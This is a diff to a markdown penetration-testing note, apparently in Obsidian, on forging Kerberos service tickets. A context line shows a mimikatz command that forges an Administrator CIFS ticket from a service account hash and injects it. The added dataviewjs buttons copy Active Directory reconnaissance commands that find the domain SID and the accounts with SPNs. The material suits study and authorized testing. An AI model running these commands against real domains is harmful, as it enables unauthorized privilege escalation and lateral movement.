@@ -19,6 +19,62 @@ Example: forging a CIFS ticket for `FILE01`.
 kerberos::golden /domain:domain.local /sid:<DOMAIN_SID> /target:FILE01.domain.local /service:cifs /rc4:<SERVICE_ACCOUNT_HASH> /user:Administrator /ptt
 ```
 
+---
+
+### **Windows— User shell**
+
+Get domain SID
+```dataviewjs
+const command = "get-addomain";
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 1000);
+});
+```
+
+Get the**Service Principal Name (SPN)** of the SQL Server account
+```dataviewjs
+const command = 'Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select-Object Name,ServicePrincipalName';
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 1000);
+});
+```
+
 ### **Kali — Impacket**
 
 ```
